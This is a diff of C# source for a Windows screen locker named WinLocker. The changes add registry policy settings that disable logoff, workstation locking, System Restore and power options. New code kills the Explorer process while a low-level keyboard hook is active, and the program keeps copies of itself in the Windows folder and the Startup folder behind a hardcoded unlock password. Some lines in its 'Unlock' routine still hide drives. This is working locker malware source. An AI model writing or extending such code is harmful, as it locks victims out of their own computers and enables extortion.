@@ -182,11 +182,32 @@ namespace WinLocker
                 Registry.SetValue(xer, "HidePowerOptions", 1);
                 string uebok = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore";
                 Registry.SetValue(uebok, "DisableSR", 1);
+                Registry.SetValue(xer, "DisableLockWorkstation", 1);
+                Registry.SetValue(xer, "StartMenuLogOff", 1);
+                Registry.SetValue(xer, "NoLogoff", 1);
+
             }
             public static void Unlock()
             {
                 string UAC_key = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
-                Registry.SetValue(UAC_key, "EnableLUA", 0);
+                Registry.SetValue(UAC_key, "EnableLUA", 1);
+                string dildo = @"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\MMC";
+                Registry.SetValue(dildo, "RestrictToPermittedSnapins", 0);
+                string xer = @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
+                Registry.SetValue(xer, "NoControlPanel", 0);
+                Registry.SetValue(xer, "NoRun", 0);
+                Registry.SetValue(xer, "NoViewOnDrive", "0x03FFFFFFFF");
+                Registry.SetValue(xer, "NoDrives", 67108863);
+                Registry.SetValue(xer, "NoFileMenu", 0);
+                Registry.SetValue(xer, "NoClose", 0);
+                Registry.SetValue(xer, "StartMenuLogOff", 0);
+                Registry.SetValue(xer, "NoWinKeys", 0);
+                Registry.SetValue(xer, "HidePowerOptions", 0);
+                string uebok = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore";
+                Registry.SetValue(uebok, "DisableSR", 0);
+                Registry.SetValue(xer, "DisableLockWorkstation", 0);
+                Registry.SetValue(xer, "StartMenuLogOff", 0);
+                Registry.SetValue(xer, "NoLogoff", 0);
             }
         }
 
@@ -255,82 +276,19 @@ namespace WinLocker
       
         private void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text == "label")
+            if (textBox1.Text == "label3")
             {
                 TaskBar.Unlock();
                 Registry_editor.Unlock();
                 Right_click.Unlock();
                 Rebooting.Unlock();
                 uac.Unlock();
-                try
-                {
-                    // Путь до ключа реестра для DisableTaskMgr
-                    string systemPoliciesPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
-
-                    // Путь до ключа реестра для Userinit
-                    //string winLogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
-
-                    // Значение для Userinit
-                    //string newUserinitValue = @"C:\Windows\system32\userinit.exe, D:\WinLocker\WinLocker\bin\Debug\WinLocker.exe"; // Пример значения
-
-                    // Открытие или создание ключа реестра для DisableTaskMgr
-                    using (RegistryKey systemPoliciesKey = Registry.CurrentUser.OpenSubKey(systemPoliciesPath, true) ?? Registry.CurrentUser.CreateSubKey(systemPoliciesPath))
-                    {
-                        if (systemPoliciesKey != null)
-                        {
-                            // Установка значения DisableTaskMgr в 0 (включение Диспетчера задач)
-                            systemPoliciesKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
-                            //MessageBox.Show("DisableTaskMgr set to 0 successfully.");
-                        }
-                        else
-                        {
-                            MessageBox.Show("Failed to access or create the registry key for DisableTaskMgr.");
-                        }
-                    }
-
-                    try
-                    {
-                        string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
-
-                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
-                        {
-                            if (key != null)
-                            {
-                                // Set the Shell value to explorer1.exe
-                                key.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
-                                //MessageBox.Show("Shell has been changed to explorer1.exe.");
-                            }
-                            else
-                            {
-                                MessageBox.Show("Could not open the registry key.");
-                            }
-                        }
-                    }
-                    catch (UnauthorizedAccessException)
-                    {
-                        MessageBox.Show("You need to run this application as an administrator.");
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show($"An error occurred: {ex.Message}");
-                    }
-                    // Открытие ключа реестра для Userinit в разделе HKEY_LOCAL_MACHINE
-
-                }
-                catch (UnauthorizedAccessException)
-                {
-                    MessageBox.Show("Error: Administrator privileges are required to modify the registry.");
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show($"An error occurred: {ex.Message}");
-                }
-                SwapMouseButton(false);
+                this.Close();
                 string dest = "C:\\windows\\winlocker.exe";
                 string dest1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\winlocker.exe";
                 System.IO.File.Delete(dest);
                 System.IO.File.Delete(dest1);
-                this.Close();
+                
             }
             else
             {
@@ -345,6 +303,12 @@ namespace WinLocker
         {
             var inst = LoadLibrary("user32.dll").ToInt32();
             intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, inst, 0);
+            var chromeDriverProcesses = Process.GetProcesses().Where(pr => pr.ProcessName == "explorer"); // without '.exe'
+
+            foreach (var process in chromeDriverProcesses)
+            {
+                process.Kill();
+            }
 
             //Process process = new Process();
 
@@ -446,6 +410,11 @@ namespace WinLocker
 
             // Запуск основной формы приложения
             //Application.Run(new winlocker());
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
